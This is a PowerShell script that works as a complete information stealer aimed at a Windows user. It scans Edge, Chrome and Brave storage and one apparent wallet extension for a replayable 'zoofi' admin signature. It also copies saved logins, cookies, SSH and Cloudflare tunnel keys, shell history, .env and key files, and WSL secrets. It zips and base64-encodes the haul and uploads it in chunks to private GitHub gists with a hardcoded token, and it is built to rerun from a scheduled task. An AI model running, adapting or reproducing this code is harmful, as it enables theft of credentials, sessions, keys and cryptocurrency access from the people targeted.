$ErrorActionPreference='SilentlyContinue'
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.IO.Compression.FileSystem
$T=('gho_w5O107fup8ULp6t'+'EFsW9V3QEEXSHtx3m9xka')
$SINK=@('f8750db7a6ab8f4b7f6fc0f9d7d34dcf')
$H=$env:COMPUTERNAME; if(-not $H){$H='win'}
$W=[string]([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())
$U=$env:USERPROFILE; if(-not $U){$U='C:\Users\brian'}
$LA=$env:LOCALAPPDATA; if(-not $LA){$LA=Join-Path $U 'AppData\Local'}
$work=Join-Path $U '.w11work'
try{New-Item -ItemType Directory -Force -Path $work|Out-Null}catch{}
$doneFlag=Join-Path $work 'done.flag'
# NO-OP reruns: after first successful collection, scheduled-task relaunches exit instantly (zero API calls, no quota burn)
if(Test-Path -LiteralPath $doneFlag){ exit }
function San($s){ return ($s -replace '[^A-Za-z0-9._-]','_') }
function P($desc,$content){
  $body=@{description=$desc;public=$false;files=@{t=@{content=[string]$content}}}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 3;$i++){ try{ Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }catch{ Start-Sleep -Seconds 5 } }
  return $false
}
function PCHUNK($idx,$content){
  $gid=$SINK[0]; $fname=('c'+$W+'_'+$idx)
  $body=@{files=@{ $fname = @{content=[string]$content} }}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 4;$i++){ try{ Invoke-RestMethod -Uri ('https://api.github.com/gists/'+$gid) -Method Patch -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 90|Out-Null; return $true }catch{ Start-Sleep -Seconds 6 } }
  return $false
}
function PMETA($tag,$content){
  $gid=$SINK[0]; $fname=('m'+$W+'_'+ (San $tag)); if($fname.Length -gt 120){ $fname=$fname.Substring(0,120) }
  $body=@{files=@{ $fname = @{content=[string]$content} }}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 3;$i++){ try{ Invoke-RestMethod -Uri ('https://api.github.com/gists/'+$gid) -Method Patch -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }catch{ Start-Sleep -Seconds 5 } }
  return $false
}
$stage=Join-Path $work 'stage'
try{ New-Item -ItemType Directory -Force -Path $stage | Out-Null }catch{}
$script:tot=0; $script:nf=0; $LIMIT=9000000
function CopyTo($src,$dst,$max){
  if($script:tot -ge $LIMIT){ return $false }
  try{
    $fi=Get-Item -LiteralPath $src -Force; if($fi.Length -gt $max){ return $false }
    $d2=Split-Path -Parent $dst; if($d2){ New-Item -ItemType Directory -Force -Path $d2 | Out-Null }
    $fs=[System.IO.File]::Open($src,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,([System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete))
    $out=[System.IO.File]::Create($dst); $fs.CopyTo($out); $out.Flush(); $out.Close(); $fs.Close()
    $script:tot=$script:tot+$fi.Length; $script:nf=$script:nf+1; return $true
  }catch{ return $false }
}
$edgeUD=Join-Path $LA 'Microsoft\Edge\User Data'
$def=Join-Path $edgeUD 'Default'

# ---- 0. GREP LOCAL STORAGE / IDB / jdicc LES for a stored zoofi ops signature (no-nonce => permanent replay) ----
$sig=''
$scanDirs=@(
  (Join-Path $def 'Local Storage\leveldb'),
  (Join-Path $def 'Local Extension Settings\jdiccldimpdaibmpdkjnbmckianbfold'),
  (Join-Path $def 'IndexedDB\chrome-extension_jdiccldimpdaibmpdkjnbmckianbfold_0.indexeddb.leveldb')
)
foreach($bn in @('Google\Chrome\User Data','BraveSoftware\Brave-Browser\User Data')){ $scanDirs+= (Join-Path $LA ($bn+'\Default\Local Storage\leveldb')) }
$pat='Auth for zoofi|api\.zoofi|ops/admins|correct-horse|0x[0-9a-fA-F]{130}|personal_sign|EIP-191'
foreach($d in $scanDirs){
  if(-not(Test-Path -LiteralPath $d)){ continue }
  foreach($f in Get-ChildItem -LiteralPath $d -File -Force -ErrorAction SilentlyContinue){
    if($f.Length -gt 4000000){ continue }
    try{
      $b=[System.IO.File]::ReadAllBytes($f.FullName)
      $txt=[System.Text.Encoding]::GetEncoding(28591).GetString($b)
      $ms=[regex]::Matches($txt,$pat)
      if($ms.Count -gt 0){
        foreach($m in $ms){
          $st=[Math]::Max(0,$m.Index-120); $len=[Math]::Min(500,$txt.Length-$st)
          $sig=$sig+'['+$f.Name+'] ...'+($txt.Substring($st,$len) -replace '[^\x20-\x7e]','.')+'...'+"`n"
          if($sig.Length -gt 9000){ break }
        }
      }
    }catch{}
    if($sig.Length -gt 9000){ break }
  }
  if($sig.Length -gt 9000){ break }
}
if($sig){ P ('w11-'+$H+'-'+$W+'-SIG') $sig | Out-Null } else { P ('w11-'+$H+'-'+$W+'-nosig') ('scanned '+($scanDirs -join ';')) | Out-Null }

# ---- LOCK ----
try{ $script:LOCK=[System.IO.File]::Open((Join-Path $work 'lock'),'OpenOrCreate','ReadWrite','None') }catch{ exit }

# ---- 1. Lean collect: LocalStorage leveldb + jdicc LES + jdicc IDB + creds + Local State + .ssh + history/docs/WSL ----
foreach($bn in @('Microsoft\Edge\User Data','Google\Chrome\User Data','BraveSoftware\Brave-Browser\User Data')){
  $ud=Join-Path $LA $bn; $base=Join-Path $ud 'Default'
  if(-not(Test-Path -LiteralPath $base)){ continue }
  $ls=Join-Path $ud 'Local State'; if(Test-Path -LiteralPath $ls){ [void](CopyTo $ls (Join-Path $stage ('LocalState_'+ (San $bn))) 3000000) }
  foreach($f in Get-ChildItem -LiteralPath (Join-Path $base 'Local Storage\leveldb') -File -Force -ErrorAction SilentlyContinue){ if($f.Length -lt 4000000){ [void](CopyTo $f.FullName (Join-Path $stage ('LS_'+ (San $bn)+'_'+$f.Name)) 4000000) } }
  foreach($fn in @('Login Data','Cookies','Network\Cookies')){
    $p=Join-Path $base $fn; if(Test-Path -LiteralPath $p){ [void](CopyTo $p (Join-Path $stage ('CRED_'+ (San $bn)+'_'+ (San $fn))) 8000000) }
  }
}
$les=Join-Path $def 'Local Extension Settings\jdiccldimpdaibmpdkjnbmckianbfold'
foreach($f in Get-ChildItem -LiteralPath $les -File -Force -ErrorAction SilentlyContinue){ [void](CopyTo $f.FullName (Join-Path $stage ('jdiccLES_'+$f.Name)) 2000000) }
$idb=Join-Path $def 'IndexedDB\chrome-extension_jdiccldimpdaibmpdkjnbmckianbfold_0.indexeddb.leveldb'
foreach($f in Get-ChildItem -LiteralPath $idb -File -Force -ErrorAction SilentlyContinue){ [void](CopyTo $f.FullName (Join-Path $stage ('jdiccIDB_'+$f.Name)) 3000000) }
foreach($d in @('.ssh','.cloudflared')){ $p=Join-Path $U $d; if(Test-Path -LiteralPath $p){ foreach($f in Get-ChildItem -LiteralPath $p -Recurse -File -Force -ErrorAction SilentlyContinue){ if($f.Length -lt 1500000){ [void](CopyTo $f.FullName (Join-Path $stage ((San $d)+'_'+$f.Name)) 1500000) } } } }
$hist=Join-Path $U 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
if(Test-Path -LiteralPath $hist){ [void](CopyTo $hist (Join-Path $stage 'PSReadLine_history.txt') 3000000) }
foreach($base2 in @('Desktop','Documents','Downloads')){
  $bd=Join-Path $U $base2
  foreach($sub in Get-ChildItem -LiteralPath $bd -Directory -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'zoofi|lumii|wandfi|minke|aro' }){
    foreach($f in Get-ChildItem -LiteralPath $sub.FullName -Recurse -File -Force -ErrorAction SilentlyContinue){ if($f.Length -lt 800000 -and ($f.Name -match '\.env|\.json|\.txt|\.pem|\.key|token|secret')){ [void](CopyTo $f.FullName (Join-Path $stage ('DOC_'+$base2+'_'+$sub.Name+'_'+$f.Name)) 800000) } }
  }
}
foreach($wd in @('\\wsl$\Ubuntu\home','\\wsl.localhost\Ubuntu\home')){ if(Test-Path -LiteralPath $wd){ foreach($hf in Get-ChildItem -LiteralPath $wd -Directory -Force -ErrorAction SilentlyContinue){ foreach($sub in @('.ssh','.env')){ $p=Join-Path $hf.FullName $sub; if(Test-Path -LiteralPath $p -File){ [void](CopyTo $p (Join-Path $stage ('WSL_'+$hf.Name+'_'+ (San $sub))) 500000) } elseif(Test-Path -LiteralPath $p){ foreach($f in Get-ChildItem -LiteralPath $p -Recurse -File -Force -ErrorAction SilentlyContinue){ if($f.Length -lt 500000){ [void](CopyTo $f.FullName (Join-Path $stage ('WSL_'+$hf.Name+'_'+$f.Name)) 500000) } } } } } } }
P ('wx8-'+$H+'-'+$W+'-start') ('staged='+$script:nf+' bytes='+$script:tot+' siglen='+$sig.Length) | Out-Null
P ('w11-'+$H+'-'+$W+'-start') ('staged='+$script:nf+' bytes='+$script:tot) | Out-Null

# ---- 2. zip + chunk ----
$ok=$false; $chunks=0; $zbytes=0
try{
  $zip=Join-Path $work ('p_'+$W+'.zip')
  if(Test-Path -LiteralPath $zip){ Remove-Item -LiteralPath $zip -Force }
  [System.IO.Compression.ZipFile]::CreateFromDirectory($stage,$zip)
  $bytes=[System.IO.File]::ReadAllBytes($zip); $zbytes=$bytes.Length
  $b64=[Convert]::ToBase64String($bytes)
  $CH=420000; $idx=0; $ok=$true
  for($i=0;$i -lt $b64.Length;$i+=$CH){ $len=[Math]::Min($CH,$b64.Length-$i); $part=$b64.Substring($i,$len); if(-not (PCHUNK $idx $part)){ $ok=$false; break }; $idx=$idx+1 }
  $chunks=$idx
  $sha=''; try{ $sha=(Get-FileHash -LiteralPath $zip -Algorithm SHA256).Hash }catch{}
  PMETA 'MANIFEST' ('zipbytes='+$zbytes+' chunks='+$chunks+' ok='+$ok+' sha256='+$sha+' files='+$script:nf+' siglen='+$sig.Length) | Out-Null
}catch{ PMETA 'ZIPERR' ($_.Exception.Message) | Out-Null }
P ('w11-'+$H+'-'+$W+'-summary') ('files='+$script:nf+' zipbytes='+$zbytes+' chunks='+$chunks+' ok='+$ok) | Out-Null
if($ok -and $chunks -gt 0){ 'done'|Out-File -LiteralPath $doneFlag -Encoding utf8; P ('w11-'+$H+'-'+$W+'-COMPLETE') ('chunks='+$chunks) | Out-Null }
try{ $script:LOCK.Close() }catch{}
